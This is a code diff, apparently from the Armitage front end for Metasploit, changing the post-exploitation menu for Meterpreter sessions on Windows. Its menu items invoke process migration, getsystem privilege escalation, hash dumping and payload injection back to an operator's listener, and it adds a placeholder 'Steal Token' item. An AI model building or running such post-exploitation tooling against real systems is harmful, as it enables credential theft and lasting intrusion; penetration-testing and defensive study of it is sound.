@@ -136,15 +136,6 @@ sub showMeterpreterMenu {
 	if ("*win*" iswm $platform) {
 		$j = menu($1, "Access", 'A');
 	
-		item($j, "Duplicate", 'D', lambda({
-			oneTimeShow("run");
-			cmd_safe("setg LPORT", lambda({
-				if ([$3 trim] ismatch 'LPORT .. (\d+).*') {
-					m_cmd($sid, "run multi_meter_inject -mr $MY_ADDRESS -p " . matched()[0]);
-				}
-			}, \$sid));
-		}, $sid => "$sid"));
-
 		item($j, "Migrate Now!", 'M', lambda({
 			oneTimeShow("run");
 			m_cmd($sid, "run migrate -f");
@@ -177,6 +168,10 @@ sub showMeterpreterMenu {
 			m_cmd($sid, "getsystem -t 0");
 		}, $sid => "$sid"));
 
+		item($j, "Steal Token", "S", lambda({
+			showError("Yes!@##?");
+		}, $sid => "$sid"));
+
 		item($j, "Dump Hashes", "D", lambda({
 			thread(lambda({
 				launch_dialog("Dump Hashes", "post", "windows/gather/smart_hashdump", 1, $null, %(SESSION => $sid, GETSYSTEM => "1"));
@@ -198,8 +193,10 @@ sub showMeterpreterMenu {
 		}, $sid => "$sid"));
 
 		item($j, "Pass Session", 'S', lambda({
-			thread(lambda({
-				launch_dialog("Pass Session", "post", "windows/manage/payload_inject", 1, $null, %(SESSION => $sid));
+			cmd_safe("setg LPORT", lambda({
+				if ([$3 trim] ismatch 'LPORT .. (\d+).*') {
+					launch_dialog("Pass Session", "post", "windows/manage/payload_inject", 1, $null, %(SESSION => $sid, LPORT => matched()[0], HANDLER => "0"));
+				}
 			}, \$sid));
 		}, $sid => "$sid"));
 	}
